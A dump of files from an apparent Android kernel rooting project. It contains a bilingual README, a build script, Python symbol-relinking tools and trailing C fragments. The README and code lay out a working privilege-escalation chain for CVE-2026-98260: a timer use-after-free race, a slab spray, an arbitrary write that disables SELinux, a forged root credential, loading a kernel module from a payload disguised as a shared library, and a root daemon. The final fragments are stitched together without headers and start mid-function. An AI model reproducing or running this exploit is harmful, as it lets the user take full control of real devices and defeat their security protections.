`payload/README.md`:

```md
# payload

> Chinese translation: [`README.zh-CN.md`](README.zh-CN.md) — a translation of this file; if the two disagree, this English file is authoritative.

Native aarch64 exploit payload (C, NDK) that is packaged into the APK as
`lib/arm64-v8a/libo3p.so` — an executable ELF disguised as a shared library.
The app copies it to `/data/local/tmp` and runs it inside a Shizuku-spawned
shell-domain process.

## Build

```bash
export NDK_CC=/path/to/ndk/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android35-clang
bash build-payload.sh
# -> build/o3p.bin      (payload executable)
# -> build/libo3p.so    (payload + three KernelSU-family LKMs + table/trailer)
```

`mk_payload.py` writes a v2 container: the payload, the three LKMs (KernelSU
v3.3.1, KernelSU-Next v3.4.2, SukiSU v4.2.1-r2), a 24-byte-per-entry tag table
and a `O3KSKM02` + `u32 count` trailer. The payload reads the trailer from
`/proc/self/exe`, detects the installed manager (or honours `O3P_KSU_FORK`),
slices out the matching LKM and loads it; the same file can still be executed
directly (`./libo3p.so`). The legacy single-LKM `O3KSKO01` layout remains
readable.

## What the payload does

1. **Trace setup**: kprobes/ftrace on `do_timer_create`, `__set_task_comm`,
   `posix_timer_unhash_and_free`, `exit_itimers`, `release_task`,
   `timerqueue_del`, `posix_cpu_timers_exit` (tracefs, 0777; shell domain is
   allowed to write it).
2. **KASLR slide**: leaks `init_user_ns` by reading the parent's `cred` through
   a kprobe (`__arm64_sys_getpid`), then `slide = leaked - INIT_USER_NS_STATIC`.
3. **CVE-2026-98260**: arms a `CLOCK_THREAD_CPUTIME_ID` POSIX timer in a
   non-leader thread, races `execve` through `de_thread`/`exit_itimers`, keeps
   the zombie (waitid WNOWAIT), then reclaims the freed order-1
   `posix_timers_cache` slab page with a kmalloc-8k (`send(...,7872)`) spray
   containing a forged `k_itimer` RB-tree node.
4. **Write primitive**: the reap (`release_task` → `posix_cpu_timers_exit` →
   `cleanup_timerqueue` → `timerqueue_del` → `rb_erase`) writes the forged
   node's `__rb_parent_color` into an arbitrary target address. The payload
   uses it to clear `selinux_state.enforcing` (stage 0, an unaligned zero at
   `selinux_state-7`) and to rewrite `task_struct.cred` (stage 1).
5. **Fake cred** (`stage 1`): a perf ring page (kernel VA leaked via kretprobe)
   holds a fake `struct cred` with uid/euid/fsuid=0, full caps, and the
   original SELinux blob pointer.
6. **KernelSU LKM (adaptive)**: before loading, the payload scans `/data/app`
   for the installed manager — `me.weishu.kernelsu` (KernelSU, tag 1),
   `com.rifsxd.ksunext` (KernelSU-Next, tag 2) or `com.sukisu.ultra`
   (SukiSU-Ultra, tag 3) — and picks that LKM from the embedded blob
   (`O3P_KSU_FORK` overrides). It then resolves the LKM's undefined symbols at
   runtime via `/proc/kallsyms` (temporarily lowering `kptr_restrict`, then
   restoring it); `O3P_RELINK_ONLY=1` falls back to the 248-symbol union +
   address+slide. With the v3 default the module is loaded **unmodified** (no
   init patch): `policycap` stays clean, so KernelSU's own `setenforce(1)` is
   harmless (`O3P_CODEPATCH=1` restores the legacy patch). It writes
   `/data/local/tmp/o3p_ksu.ko` and `insmod`s it from a forked `/system/bin/sh`.
7. **rootd**: forks a detached root daemon; the parent execs the payload with
   `--rootd`, which listens on the abstract unix socket `@o3p_rootd` and only
   accepts peers with uid 0 or 2000 (SO_PEERCRED). Clients: `--shell "<cmd>"`.

## Environment switches

All are optional; production usage (the APK or `--shell`) should leave them
unset.

| variable | value | effect |
|---|---|---|
| `O3P_SELDIRTY` | `1` | legacy stage-0 write: 8 bytes at `selinux_state` (dirties `policycap[]`, ends Permissive, network breaks once Enforcing returns). v3 default is the clean unaligned zero at `selinux_state-7`. |
| `O3P_CODEPATCH` | `1` | legacy KernelSU init patch (`mov w0,#1` → `#0`); v3 default loads the LKM unmodified. |
| `O3P_NOSEL` | `1` | skip stage 0 (SELinux) entirely — debugging only. |
| `O3P_NOKSU` | `1` | skip the KernelSU blob load. |
| `O3P_RELINK_ONLY` | `1` | bypass `/proc/kallsyms`; relink with the embedded 248-symbol table + slide. |
| `O3P_KSU_FORK` | `tiann` / `next` / `sukisu` | force one embedded LKM instead of manager-based selection. |
| `O3P_D3` | `1` | lab demo of the three-timerqueue single reap (D); no KernelSU, shell domain only. |
| `O3P_D3V3` | `1` | **unsafe**: single-reap cred+enforcing+no-op experiment (v3a–v3c); panics on this kernel. |
| `O3P_SDLOG` | `1` | mirror progress to `/sdcard/o3p_sd.log` (debugging; FUSE writes may be lost on panic). |
| `O3P_SIDFORGE` | `1` | **abandoned**: forge `cred_security_struct.sid=1`; yields `unlabeled` and KernelSU `hook_file_open` oops. |

## Files

| file | role |
|---|---|
| `o3p.c` | complete payload (≈55 KB of C; generated from the t32/t34 lineage) |
| `ksu/ksu_symtab.h` | union of 248 KernelSU symbols (upstream forks) → vmlinux addresses; used by the relink fallback |
| `ksu/mksymtab.py` | regenerate `ksu_symtab.h` from `vmlinux.elf` (+ env `VMLINUX`) |
| `ksu/relink_ksu.py` | offline relinker, reference for the runtime `ksu_patch` |
| `mk_payload.py` | pack payload + three LKMs + tag table/trailer → `libo3p.so` |
| `lkm/lkm-aarch64-…kernelsu.ko` | official KernelSU v3.3.1 LKM for `android17-6.18` (GPL-3.0) |
| `lkm/aarch64-next-…kernelsu.ko` | official KernelSU-Next v3.4.2 LKM for `android17-6.18` (GPL-3.0) |
| `lkm/sukisu-aarch64-…ko` | official SukiSU-Ultra v4.2.1-r2 LKM for `android17-6.18` (GPL-3.0) |
| `legacy/t32.c`, `legacy/t34.c`, `legacy/mk_o3p.py` | earlier exploit revisions; `mk_o3p.py` shows how `o3p.c` was derived from `t34.c` |

## Notes

- The payload is **device/profile specific**: offsets and static addresses are
  compiled for `6.18.21-android17-5-g805aa6adea19-abogki565292102-4k` on
  yingtian/lhasa. See `docs/ARCHITECTURE.md` for the constants and how to
  re-derive them for another kernel.
- The v3 default is an unaligned zero at `selinux_state-7`: it clears only
  `enforcing`, so `initialized`/`policycap[]` stay intact and re-enabling
  Enforcing is safe; the app therefore ships no recovery guard. Only the legacy
  `O3P_SELDIRTY=1` path corrupts `policycap[]` (bytes 2..7) and can break the
  network once Enforcing returns; see `docs/SECURITY.md`.

```

`payload/README.zh-CN.md`:

```md
# payload（中文版）

> 英文原版：[`README.md`](README.md)。若两者不一致，以英文版为准并同步本文件。

原生 aarch64 利用载荷（C，NDK），以 `lib/arm64-v8a/libo3p.so` 的形式打进 APK ——
一个伪装成共享库的可执行 ELF。App 会把它复制到 `/data/local/tmp`，并在
Shizuku 拉起的 shell 域进程里运行。

## 构建

```bash
export NDK_CC=/path/to/ndk/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android35-clang
bash build-payload.sh
# -> build/o3p.bin      （载荷可执行文件）
# -> build/libo3p.so    （载荷 + 三种 KernelSU 系 LKM + 条目表/trailer）
```

`mk_payload.py` 现在写 v2 容器：载荷 + 三种 LKM（KernelSU v3.3.1、
KernelSU-Next v3.4.2、SukiSU v4.2.1-r2）+ 每项 24 字节的 tag 表 +
`O3KSKM02`/count trailer。载荷从 `/proc/self/exe` 读 trailer，识别已装管理器
（或 `O3P_KSU_FORK` 覆盖），切出对应 LKM 再加载；同一个文件仍可直接执行
（`./libo3p.so`）。旧的单 LKM `O3KSKO01` 布局仍可读。

## 载荷做什么

1. **trace 准备**：在 `do_timer_create`、`__set_task_comm`、
   `posix_timer_unhash_and_free`、`exit_itimers`、`release_task`、
   `timerqueue_del`、`posix_cpu_timers_exit` 上挂 kprobe/ftrace
   （tracefs 为 0777；shell 域允许写）。
2. **KASLR slide**：通过 kprobe（`__arm64_sys_getpid`）读父进程的 `cred`，泄漏
   `init_user_ns`，然后 `slide = leaked - INIT_USER_NS_STATIC`。
3. **CVE-2026-98260**：在非 leader 线程里武装一个 `CLOCK_THREAD_CPUTIME_ID`
   POSIX timer，让 `execve` 经 `de_thread`/`exit_itimers` 竞态，保留僵尸
   （waitid WNOWAIT），再用带伪造 `k_itimer` RB 节点的 kmalloc-8k
   （`send(...,7872)`）喷页回收已释放的 order-1 `posix_timers_cache` slab 页。
4. **写原语**：回收（`release_task` → `posix_cpu_timers_exit` →
   `cleanup_timerqueue` → `timerqueue_del` → `rb_erase`）会把伪造节点的
   `__rb_parent_color` 写进任意目标地址。载荷用它清
   `selinux_state.enforcing`（stage 0：在 `selinux_state-7` 做非对齐零写）并把
   `task_struct.cred` 换成伪造页（stage 1）。
5. **伪造 cred**（`stage 1`）：一个 perf ring 页（内核 VA 经 kretprobe 泄漏）里放
   伪造的 `struct cred`，uid/euid/fsuid=0、full caps、`security` 沿用原来的
   SELinux blob 指针。
6. **KernelSU LKM（自适应）**：加载前扫描 `/data/app` 识别已装管理器——
   `me.weishu.kernelsu`（KernelSU，tag 1）、`com.rifsxd.ksunext`（KernelSU-Next，tag 2）、
   `com.sukisu.ultra`（SukiSU-Ultra，tag 3）——从内置 blob 里切出对应 LKM
   （`O3P_KSU_FORK` 可覆盖）。随后经 `/proc/kallsyms` 解析该 LKM 的未定义符号
   （临时降低 `kptr_restrict`，结束前恢复）；`O3P_RELINK_ONLY=1` 时回退到
   248 符号并集 + address+slide。v3 默认加载**未修改**的模块（不打 init 补丁）：`policycap` 干净，KernelSU
   自己的 `setenforce(1)` 无害（`O3P_CODEPATCH=1` 可回退旧补丁）。随后写
   `/data/local/tmp/o3p_ksu.ko`，从 fork 出的 `/system/bin/sh` 执行 `insmod`。
7. **rootd**：fork 一个脱离的 root 守护进程；父进程以 `--rootd` exec 载荷，后者
   监听抽象 unix socket `@o3p_rootd`，只接受 uid 0 或 2000 的对端
   （SO_PEERCRED）。客户端：`--shell "<cmd>"`。

## 环境开关

全部可选；生产使用（APK 或 `--shell`）应保持不设置。

| 变量 | 值 | 作用 |
|---|---|---|
| `O3P_SELDIRTY` | `1` | 旧 stage-0 写：在 `selinux_state` 写 8 字节（污染 `policycap[]`、终态 Permissive，Enforcing 回来会断网）。v3 默认是 `selinux_state-7` 的干净非对齐零写。 |
| `O3P_CODEPATCH` | `1` | 旧 KernelSU init 补丁（`mov w0,#1`→`#0`）；v3 默认加载未修改模块。 |
| `O3P_NOSEL` | `1` | 跳过 stage 0（SELinux）——仅调试。 |
| `O3P_NOKSU` | `1` | 跳过 KernelSU blob 加载。 |
| `O3P_RELINK_ONLY` | `1` | 绕过 `/proc/kallsyms`，用内置 248 符号表 + slide 重链接。 |
| `O3P_KSU_FORK` | `tiann`/`next`/`sukisu` | 强制使用某个内置 LKM，而非按管理器选择。 |
| `O3P_D3` | `1` | 三 timerqueue 单次回收实验（D）；不加载 KernelSU，仅 shell 域。 |
| `O3P_D3V3` | `1` | **危险**：单次回收 cred+enforcing+空写实验（v3a–v3c），本内核会 panic。 |
| `O3P_SDLOG` | `1` | 进度镜像到 `/sdcard/o3p_sd.log`（调试；panic 时 FUSE 写可能丢）。 |
| `O3P_SIDFORGE` | `1` | **已废弃**：伪造 `cred_security_struct.sid=1`；得到 `unlabeled` 且 KernelSU `hook_file_open` oops。 |

## 文件

| 文件 | 作用 |
|---|---|
| `o3p.c` | 完整载荷（约 55 KB C；由 t32/t34 血统生成） |
| `ksu/ksu_symtab.h` | 上游各 fork 的 248 个 KernelSU 符号并集 → vmlinux 地址（供 relink 回退） |
| `ksu/mksymtab.py` | 从 `vmlinux.elf` 重新生成 `ksu_symtab.h`（env `VMLINUX`） |
| `ksu/relink_ksu.py` | 离线重链接器，运行时 `ksu_patch` 的参考实现 |
| `mk_payload.py` | 打包载荷 + 三种 LKM + tag 表/trailer → `libo3p.so` |
| `lkm/lkm-aarch64-…kernelsu.ko` | `android17-6.18` 的官方 KernelSU v3.3.1 LKM（GPL-3.0） |
| `lkm/aarch64-next-…kernelsu.ko` | `android17-6.18` 的官方 KernelSU-Next v3.4.2 LKM（GPL-3.0） |
| `lkm/sukisu-aarch64-…ko` | `android17-6.18` 的官方 SukiSU-Ultra v4.2.1-r2 LKM（GPL-3.0） |
| `legacy/t32.c`、`legacy/t34.c`、`legacy/mk_o3p.py` | 早期利用版本；`mk_o3p.py` 展示 `o3p.c` 如何从 `t34.c` 派生 |

## 注意

- 载荷是**设备/profile 特定**的：偏移与静态地址都是按
  `6.18.21-android17-5-g805aa6adea19-abogki565292102-4k`（yingtian/lhasa）编译
  的。常量与换内核时如何重新推导，见 `docs/ARCHITECTURE.md`。
- v3 默认是在 `selinux_state-7` 做非对齐零写：只清 `enforcing`，
  `initialized`/`policycap[]` 原样保留，所以重新开启 Enforcing 是安全的，App
  不再带恢复守护。只有旧 `O3P_SELDIRTY=1` 路径会破坏 `policycap[]`（第 2..7
  字节），并在 Enforcing 回来时可能弄坏网络；见 `docs/SECURITY.md`。

```

`payload/build-payload.sh`:

```sh
#!/usr/bin/env bash
# Build the native payload and pack it with the KernelSU LKM.
#
# Required: NDK_CC  (aarch64 clang from the Android NDK, e.g.
#   $NDK/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android35-clang[.cmd])
# Optional:
#   KSU_LKM  path to the KernelSU .ko (default lkm/lkm-aarch64-android17-6.18_kernelsu.ko)
#   PY       python interpreter (default python3)
#   OUT      output dir (default build)
set -euo pipefail
cd "$(dirname "$0")"
: "${NDK_CC:?set NDK_CC to aarch64-linux-androidXX-clang}"
PY=${PY:-python3}
OUT=${OUT:-build}
KSU_LKM=${KSU_LKM:-$PWD/lkm/lkm-aarch64-android17-6.18_kernelsu.ko}
mkdir -p "$OUT"

"$NDK_CC" -std=gnu11 -O2 -I "$PWD/ksu" -o "$OUT/o3p.bin" o3p.c
echo "payload: $OUT/o3p.bin ($(wc -c < "$OUT/o3p.bin") bytes)"

"$PY" mk_payload.py --payload "$OUT/o3p.bin" --ko "$KSU_LKM" --out "$OUT/libo3p.so"
echo "blob:    $OUT/libo3p.so"

```

`payload/ksu/mksymtab.py`:

```py
#!/usr/bin/env python3
"""Regenerate ksu_symtab.h: KernelSU LKM undefined symbols -> vmlinux addresses.

The payload links the LKM at runtime by rewriting its undefined symbols to
SHN_ABS + (vmlinux address + KASLR slide). This script produces the static
name->address table that is compiled into the payload (ksu_symtab.h).

Environment:
  VMLINUX     path to vmlinux.elf (extracted from the target boot image)
  KSU_LKM     path to the KernelSU LKM  (default: ../lkm/lkm-aarch64-android17-6.18_kernelsu.ko)
  OUT         output header             (default: ./ksu_symtab.h next to this script)
  PYELFTOOLS  directory containing elftools/ (optional; otherwise pip pyelftools)
"""
import os
import struct
import sys


def _bootstrap_elftools():
    p = os.environ.get('PYELFTOOLS')
    if p:
        sys.path.insert(0, p)


_bootstrap_elftools()
from elftools.elf.elffile import ELFFile  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
VMLINUX = os.environ.get('VMLINUX', '')
KO = os.environ.get('KSU_LKM', os.path.join(HERE, '..', 'lkm', 'lkm-aarch64-android17-6.18_kernelsu.ko'))
OUT = os.environ.get('OUT', os.path.join(HERE, 'ksu_symtab.h'))


def load_vmlinux(path):
    """name -> (st_value, type, bind), preferring GLOBAL FUNC/OBJECT entries."""
    m = {}
    with open(path, 'rb') as f:
        e = ELFFile(f)
        st = e.get_section_by_name('.symtab')
        if st is None:
            raise SystemExit('no .symtab in ' + path)
        for s in st.iter_symbols():
            n = s.name
            if not n:
                continue
            cand = (s['st_value'], s['st_info']['type'], s['st_info']['bind'])
            old = m.get(n)
            if old is None:
                m[n] = cand
            else:
                score = lambda x: (x[2] != 'STB_LOCAL', x[1] in ('STT_FUNC', 'STT_OBJECT'))
                if score(cand) > score(old):
                    m[n] = cand
    return m


def main():
    if not VMLINUX:
        raise SystemExit('set VMLINUX to a vmlinux.elf path')
    syms = load_vmlinux(VMLINUX)
    data = open(KO, 'rb').read()
    with open(KO, 'rb') as f:
        e = ELFFile(f)
        st = e.get_section_by_name('.symtab')
        if st is None:
            raise SystemExit('no .symtab in ' + KO)
        sec = e.get_section(e.get_section_index('.symtab'))
        off = sec['sh_offset']
        entsize = sec['sh_entsize'] or 24
        count = sec['sh_size'] // entsize
        sdata = e.get_section(sec['sh_link']).data()

    rows = []
    for i in range(count):
        base = off + i * entsize
        st_name, = struct.unpack_from('<I', data, base)
        shndx, = struct.unpack_from('<H', data, base + 6)
        if shndx != 0 or st_name == 0:
            continue  # only undefined symbols
        end = sdata.find(b'\x00', st_name)
        name = sdata[st_name:end].decode('ascii', 'replace')
        hit = syms.get(name)
        if hit is None:
            print('MISS', name)
            continue
        rows.append((name, hit[0]))

    rows.sort()
    with open(OUT, 'w', encoding='ascii') as o:
        o.write('/* auto-generated: KernelSU LKM undefined symbols -> vmlinux static addresses */\n')
        o.write('#define KSU_SYM_COUNT %d\n' % len(rows))
        o.write('struct ksu_sym_entry { const char *name; unsigned long long addr; };\n')
        o.write('static const struct ksu_sym_entry ksu_syms[KSU_SYM_COUNT] = {\n')
        for n, a in rows:
            o.write('  {"%s", 0x%xULL},\n' % (n, a))
        o.write('};\n')
    print('wrote', OUT, 'count', len(rows))


if __name__ == '__main__':
    main()

```

`payload/ksu/relink_ksu.py`:

```py
#!/usr/bin/env python3
"""Offline relinker for the KernelSU LKM (reference / verification tool).

Rewrites every undefined symbol of the LKM to SHN_ABS with the absolute
address (vmlinux static address + KASLR slide). This is exactly what the
payload does at runtime (payload/o3p.c: ksu_patch / ksu_load); this script is
useful to pre-build a relinked .ko for a known slide or to diff against the
payload's in-memory result.

Usage:
  python3 relink_ksu.py                 # dry run: list unresolved symbols
  python3 relink_ksu.py --patch 0x2c2ea00000

Environment:
  VMLINUX     path to vmlinux.elf (required)
  KSU_LKM     path to the input LKM  (default: ../lkm/lkm-aarch64-android17-6.18_kernelsu.ko)
  OUT         output .ko path         (default: ./kernelsu_relinked.ko)
  PYELFTOOLS  dir containing elftools/
"""
import os
import struct
import sys


def _bootstrap_elftools():
    p = os.environ.get('PYELFTOOLS')
    if p:
        sys.path.insert(0, p)


_bootstrap_elftools()
from elftools.elf.elffile import ELFFile  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
VMLINUX = os.environ.get('VMLINUX', '')
KO = os.environ.get('KSU_LKM', os.path.join(HERE, '..', 'lkm', 'lkm-aarch64-android17-6.18_kernelsu.ko'))
OUT = os.environ.get('OUT', os.path.join(HERE, 'kernelsu_relinked.ko'))
SHN_ABS = 0xfff1


def load_vmlinux(path):
    m = {}
    with open(path, 'rb') as f:
        e = ELFFile(f)
        st = e.get_section_by_name('.symtab')
        if st is None:
            raise SystemExit('no .symtab in ' + path)
        for s in st.iter_symbols():
            n = s.name
            if not n:
                continue
            cand = (s['st_value'], s['st_info']['type'], s['st_info']['bind'])
            old = m.get(n)
            if old is None:
                m[n] = cand
            else:
                score = lambda x: (x[2] != 'STB_LOCAL', x[1] in ('STT_FUNC', 'STT_OBJECT'))
                if score(cand) > score(old):
                    m[n] = cand
    return m


def patch(check_only, slide):
    if not VMLINUX:
        raise SystemExit('set VMLINUX to a vmlinux.elf path')
    syms = load_vmlinux(VMLINUX)
    print('vmlinux syms', len(syms))
    with open(KO, 'rb') as fh:
        data = bytearray(fh.read())
    with open(KO, 'rb') as fh:
        e = ELFFile(fh)
        st = e.get_section_by_name('.symtab')
        if st is None:
            raise SystemExit('no .symtab in ' + KO)
        sec = e.get_section(e.get_section_index('.symtab'))
        off = sec['sh_offset']
        entsize = sec['sh_entsize'] or 24
        count = sec['sh_size'] // entsize
        sdata = e.get_section(sec['sh_link']).data()

    found, missing, weakmiss = [], [], []
    for i in range(count):
        base = off + i * entsize
        st_name, = struct.unpack_from('<I', data, base)
        info = data[base + 4]
        shndx, = struct.unpack_from('<H', data, base + 6)
        if shndx != 0 or st_name == 0:
            continue
        end = sdata.find(b'\x00', st_name)
        name = sdata[st_name:end].decode('ascii', 'replace')
        bind = info >> 4
        hit = syms.get(name)
        if hit is None:
            (weakmiss if bind == 2 else missing).append(name)
            continue
        found.append(name)
        if not check_only:
            struct.pack_into('<H', data, base + 6, SHN_ABS)
            struct.pack_into('<Q', data, base + 8, hit[0] + slide)

    print('undef symbols:', len(found) + len(missing) + len(weakmiss),
          'found', len(found), 'missing', len(missing), 'weakmissing', len(weakmiss))
    print('MISSING:', missing)
    print('WEAKMISSING:', weakmiss)
    if not check_only:
        open(OUT, 'wb').write(data)
        print('wrote', OUT, len(data), 'slide=', hex(slide))


def main():
    check_only = '--patch' not in sys.argv
    slide = 0
    if not check_only:
        slide = int(sys.argv[sys.argv.index('--patch') + 1], 0)
    patch(check_only, slide)


if __name__ == '__main__':
    main()

```

import io, sys, re
src = open('t34.c', encoding='utf-8', errors='surrogateescape').read()

# 1) rename identifiers/strings

KSU_CODE = r'''
/* ==== KernelSU LKM: runtime relink + finit_module ==== */
#define KSU_SHN_ABS 0xfff1

static unsigned char *ksu_blob_load(size_t *plen){
  int fd=open("/proc/self/exe",O_RDONLY); if(fd<0)return NULL;
  off_t end=lseek(fd,0,SEEK_END);
  struct ksu_trailer { char m[8]; unsigned long long off,len; } tr;
  if(end<(off_t)sizeof tr){close(fd);return NULL;}
  lseek(fd,(off_t)(end-(off_t)sizeof tr),SEEK_SET);
  if(read(fd,&tr,sizeof tr)!=(ssize_t)sizeof tr){close(fd);return NULL;}
  if(memcmp(tr.m,"O3KSKO01",8)||tr.len==0||tr.len>(8u<<20)||tr.off+(unsigned long long)tr.len>(unsigned long long)end){close(fd);return NULL;}
  unsigned char *b=(unsigned char*)malloc(tr.len);
  if(!b){close(fd);return NULL;}
  lseek(fd,(off_t)tr.off,SEEK_SET);
  size_t got=0;
  while(got<tr.len){ssize_t r=read(fd,b+got,tr.len-got); if(r<=0)break; got+=r;}
  close(fd);
  if(got!=tr.len){free(b);return NULL;}
  *plen=tr.len; return b;
}

static int ksu_patch(unsigned char *d,size_t len,unsigned long long slide){
  unsigned long long shoff; unsigned short shentsize=0,shnum=0;
  if(len<64||d[0]!=0x7f||d[1]!='E')return -1;
  memcpy(&shoff,d+0x28,8); memcpy(&shentsize,d+0x3a,2); memcpy(&shnum,d+0x3c,2);
  if(shentsize<64||shnum==0||shnum>64)return -2;
  if(shoff+(unsigned long long)shentsize*shnum>len)return -3;
  int found=0,missing=0,strs=0;
  for(int i=0;i<shnum;i++){
    unsigned char *sh=d+shoff+(size_t)i*shentsize;
    unsigned int type; memcpy(&type,sh+4,4);
    if(type!=2)continue;
    unsigned long long soff,ssize,entsize; unsigned int link;
    memcpy(&soff,sh+0x18,8); memcpy(&ssize,sh+0x20,8); memcpy(&link,sh+0x28,4); memcpy(&entsize,sh+0x38,8);
    if(entsize<24||link>=shnum||soff+ssize>len)return -4;
    unsigned char *shr=d+shoff+(size_t)link*shentsize;
    unsigned long long stoff,stsize;
    memcpy(&stoff,shr+0x18,8); memcpy(&stsize,shr+0x20,8);
    if(stoff+stsize>len)return -5;
    const char *str=(const char*)(d+stoff);
    size_t n=(size_t)(ssize/entsize);
    for(size_t k=0;k<n;k++){
      unsigned char *s=d+soff+k*entsize;
      unsigned int nameoff; memcpy(&nameoff,s,4);
      unsigned short shndx; memcpy(&shndx,s+6,2);
      if(shndx!=0||nameoff==0||nameoff>=stsize)continue;
      const char *nm=str+nameoff;
      int hit=-1;
      for(int j=0;j<KSU_SYM_COUNT;j++){ if(!strcmp(ksu_syms[j].name,nm)){hit=j;break;} }
      if(hit<0){missing++;continue;}
      unsigned short abs=KSU_SHN_ABS; memcpy(s+6,&abs,2);
      unsigned long long v=ksu_syms[hit].addr+slide; memcpy(s+8,&v,8);
      found++;
    }
    strs++;
  }
  printf("KSU_PATCH symtabs=%d found=%d missing=%d\n",strs,found,missing);fflush(stdout);
  return found>0?0:-6;
}

static void ksu_modlist(void){
  int fd=open("/proc/modules",O_RDONLY);
  if(fd<0){printf("KSU_MODULE UNKNOWN\n");fflush(stdout);return;}
  char b[8192]; ssize_t n=read(fd,b,sizeof b-1); close(fd);
  if(n<=0){printf("KSU_MODULE UNKNOWN\n");fflush(stdout);return;}
  b[n]=0;
  printf("KSU_MODULE %s\n",strstr(b,"kernelsu")?"LIVE":"ABSENT");fflush(stdout);
}

static int ksu_load(unsigned long long slide){
  size_t len=0;
  unsigned char *b=ksu_blob_load(&len);
  if(!b){printf("KSU_BLOB MISSING\n");fflush(stdout);return -1;}
  printf("KSU_BLOB len=%zu slide=0x%llx\n",len,slide);fflush(stdout);
  int r=ksu_patch(b,len,slide);
  if(r){printf("KSU_PATCH_FAIL r=%d\n",r);fflush(stdout);free(b);return -1;}
  const char *out="/data/local/tmp/o3p_ksu.ko";
  int fd=open(out,O_WRONLY|O_CREAT|O_TRUNC,0644);
  if(fd<0){printf("KSU_WRITE_FAIL errno=%d\n",errno);fflush(stdout);free(b);return -1;}
  size_t w=0;
  while(w<len){ssize_t x=write(fd,b+w,len-w); if(x<=0)break; w+=x;}
  close(fd); free(b);
  printf("KSU_WROTE %s %zu\n",out,w);fflush(stdout);
  if(w!=len)return -1;
  int kfd=open(out,O_RDONLY|O_CLOEXEC);
  if(kfd<0){printf("KSU_OPEN_FAIL errno=%d\n",errno);fflush(stdout);return -1;}
  errno=0;
  long rc=syscall(273,kfd,"",0);
  int e=errno;
  close(kfd);
  printf("KSU_INSMOD rc=%ld errno=%d\n",rc,e);fflush(stdout);
  ksu_modlist();
  return (int)rc;
}

'''

  }
  return nok;
}
#define SPMAXC 10

static void spray_cpus(int base,int cnt){
 int nc=(int)sysconf(_SC_NPROCESSORS_ONLN);if(nc>SPMAXC)nc=SPMAXC;if(nc<1)nc=1;
 pthread_t th[SPMAXC];for(int c=0;c<SPMAXC;c++)th[c]=0;
 for(int c=0;c<nc;c++){int lo=base+(int)((long)cnt*c/nc),hi=base+(int)((long)cnt*(c+1)/nc);
  g_sp_lo[c]=lo;g_sp_n[c]=hi-lo;
  if(pthread_create(&th[c],0,spray_thread,(void*)(long)c)!=0)th[c]=0;}
 for(int c=0;c<nc;c++)if(th[c])pthread_join(th[c],0);}
static void spray_one(void){for(int i=0;i<nsv;i++){ssize_t w=send(sv[i][0],pat,7872,MSG_DONTWAIT);if(w==7872)__sync_fetch_and_add(&ppages,1);}}
static void close_skb(void){for(int i=0;i<nsv;i++){close(sv[i][0]);close(sv[i][1]);}nsv=0;ppages=0;}
static int detect_hit(void){
  unsigned long long ad[8],vv[8];int n=0;
  ad[n++]=MARK;ad[n++]=PAGE+off+0xe0;ad[n++]=PAGE+off+0xf0;
  ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=PAGE+off+0xf8;
  int g=read_addrs(ad,vv,n);
  if(g<=0)return 0;
  if(vv[0]!=MARKVAL)return 0;
  for(int k=0;k<n;k++)printf("  D[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
  if(vv[1]!=g_fakekva||vv[2]!=S)printf("  WARN node mismatch\n");
  return 1;
}
static void drain_all_pcp(void){
  for(int cpu=0;cpu<10;cpu++){pin(cpu);prime_pcp(2048);}
  pin(0);msleep(100);
}
static int slab_named(const char*name){
  FILE*f=fopen("/proc/slabinfo","r"); if(!f)return -1;
  char b[1024]; int res=-1; size_t L=strlen(name);
  while(fgets(b,sizeof b,f)){
    if(strncmp(b,name,L))continue;
    char*q=strstr(b,"slabdata");if(!q)break;long s1=0,s2=0;if(sscanf(q,"slabdata %ld %ld",&s1,&s2)<2)break;
    res=(int)s2;break;
  }
  fclose(f);return res;
}
static void benign_cleanup(pid_t pid,int zombie){
  if(zombie){printf("benign reap\n");fflush(stdout);waitpid(pid,0,0);}
  kill(-pid,SIGKILL);kill(pid,SIGKILL);msleep(80);
  while(waitpid(-1,0,WNOHANG)>0){}
}
static void unpin0(void){cpu_set_t cs;CPU_ZERO(&cs);for(int i=0;i<16;i++)CPU_SET(i,&cs);sched_setaffinity(0,sizeof cs,&cs);}
static pid_t g_me;
#define INIT_USER_NS_STATIC 0xffffffc0826d10d8ULL
#define SELINUX_STATE_STATIC 0xffffffc082959630ULL
static unsigned long long g_cred=0,g_tg[4]={0,0,0,0};static int g_stage=0,g_ntg=0;
static unsigned long long g_un=0,g_sel=0;
#define FULL_CAP_MASK 0x1ffffffffffULL
static int g_pfd=-1; static void *g_pmap=0; static unsigned long long g_fakekva=0;
static unsigned long long g_sec=0,g_usr=0,g_uc=0,g_gi=0;
static int g_armed=0; static char g_self[256]={0};

static void fill_fake_cred(unsigned long long naddr){
 if(!g_pmap)return;
 memset(g_pmap,0,4096);
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=g_fakekva; q[1]=0; q[2]=naddr; q[3]=0;
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 q[0x80/8]=g_sec;q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}
static void repair_fake_cred(void){
 if(!g_pmap)return;
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=0x100000; q[1]=0; q[2]=0; q[3]=0; q[4]=0;
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 q[0x80/8]=g_sec;q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}


/* ---------- attempt: UAF trigger + 8K victim page reclaim ---------- */
static int do_attempt(int att, pid_t *outpid){
 A=TASK=PTASK=0; close_skb(); int slabs0=slab_slabs();
 printf("== attempt %d slabs0=%d\n",att,slabs0);fflush(stdout);
 unpin0();
 {int np=precreate_pairs(g_pairs);printf("pairs=%d\n",np);fflush(stdout);}
 trunc_trace();wf(TR"/tracing_on","1\n");

